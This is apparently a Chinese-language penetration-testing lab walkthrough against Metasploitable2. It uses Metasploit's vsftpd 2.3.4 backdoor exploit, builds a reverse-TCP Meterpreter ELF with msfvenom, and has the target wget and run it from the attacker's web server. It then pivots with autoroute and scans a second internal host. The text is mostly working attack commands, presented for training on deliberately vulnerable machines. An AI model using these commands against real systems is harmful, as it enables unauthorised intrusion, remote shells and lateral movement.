# Metasploit攻击VSFTPD2.3.4后门漏洞并渗透内网

攻击机：Kali 192.168.109.137

靶机：Metasploitable2 192.168.109.140

内网另一主机： Metasploitable2 192.168.109.159

工具：Metasploit

## 开启MSF

```
msfconsole
```

## 扫描指定主机的服务和端口

```
nmap -sV -p 21,22,25,80,110,443,445 192.168.109.140
```

如果要存入MSF的数据库，则：

```
db_nmap -sV -p 21,22,25,80,110,443,445 192.168.109.140
```

## 列出在目标端口上运行的服务

```
services
```

## 过滤服务只显示开启的服务

```
services -u
```

## 列出数据库中所有的主机

```
hosts
```

## 漏洞攻击

```
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOST 192.168.109.140
set RPORT 21
show payloads
set payload cmd/unix/interact
exploit
```

注：所有操作都是在MSF终端下

**这里，我们继续将Shell控制升级为Meterpreter命令行。**

在攻击机Kali上重新开启一个终端：

## 生成反弹木马

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST 192.168.109.137 LPORT 4444 -f elf > backdoor.elf
```

注：elf是Linux系统下的默认扩展名

## 启动Kali上的Apache服务，并将backdoor.elf放置到服务器中

```
service apache2 start
mv backdoor.elf /var/www/html/
```

这样，就可以让目标系统从我们的计算机中下载这个木马文件了。

## 在目标机上下载木马文件

切换到第6步的终端，执行命令：

```
wget http://192.168.109.137/backdoor.elf
```

即将木马文件下载到了目标机上

## 在新开启的终端上执行如下命令

```
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.109.137
set LPORT 4444
exploit
```

## 在目标机上运行木马文件

切换到第6步的终端，执行命令：

```
chmod 7777 backdoor.elf
./backdoor.elf
```

## 查看反弹的Meterpreter终端

回到新开启的终端上查看，此时，我们看到已经反弹回Meterpreter命令行了。

接下来，就可以在Meterpreter终端进行操作了。

**下面，我们渗透内部网络。**

## 查看ARP内容

```
arp
```

由输出可以看出，内网中有另一主机IP地址为：192.168.109.159

**为了渗透进入这个内部网络，需要在成功渗透的主机上使用autoroute命令来设置跳板。**

## 设置跳板

在Meterpreter终端执行：

```
run autoroute -p
run autoroute -s 192.168.109.0 255.255.255.0
run autoroute -p
```

此时，我们的MSF就可以通过这个Meterpreter会话连接到内部网络。

## 将Meterpreter会话切换到后台

```
background
```

接下来就对这个网络中IP地址为192.168.109.159的主机使用auxiliary/scanner/portscan/tcp辅助模块进行一次端口扫描

## 对内网主机192.168.109.159进行端口扫描

```
use auxiliary/scanner/portscan/tcp
show options
setg RHOSTS 192.168.109.159
run
```

注意：设置RHOSTS的值时，这里使用的是setg命令，这样就会使RHOSTS的值设置为全局的192.168.109.159，从而无需反复输入这个命令。

由输出可知，在192.168.109.159上运行着很多服务，而且80端口是开放的。接下来使用auxiliary/scanner/http/http_version来验证目标主机在80端口上运行的服务。

## 验证192.168.109.159 80端口运行的服务

```
use auxiliary/scanner/http/http_version
show options
set RHOSTS 192.168.109.159
run
```

由输出可知，在主机80端口上运行的是Apache2.2.8服务器，其中的PHP 5.2.4版本是存在漏洞的，可以被攻击者获取对目标系统的控制。